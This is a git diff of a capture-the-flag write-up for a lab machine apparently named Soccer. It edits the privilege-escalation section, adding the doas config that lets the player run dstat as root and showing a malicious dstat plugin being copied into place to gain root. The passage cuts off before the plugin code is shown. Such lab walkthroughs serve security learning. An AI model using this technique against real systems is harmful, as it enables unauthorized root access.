@@ -227,7 +227,7 @@ Table: accounts
 
 ## Privesc
 
-We have doas SUID
+We have doas as SUID
 ```bash
 player@soccer:~$ cd /usr/local/bin/
 player@soccer:/usr/local/bin$ ls -la
@@ -239,7 +239,14 @@ drwxr-xr-x 10 root root  4096 Nov 15 21:38 ..
 -rwxr-xr-x  1 root root  5471 Nov 17 09:09 vidoas
 ```
 
-And there's dstat, which can be used for privec as mentionned [here](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/#dstat)
+This is the config file for doas, that's the equivalent fo sudo -l 
+```bash
+cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+There's dstat on the box, and because of the doas config we can execute it as root   
+This means it can be used for privec as mentionned [here](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/#dstat)
 ```bash
 sqlyer@soccer:/usr/local/share/dstat$ cp /dev/shm/dstat_newt.py .
 player@soccer:/usr/local/share/dstat$ cat dstat_newt.py
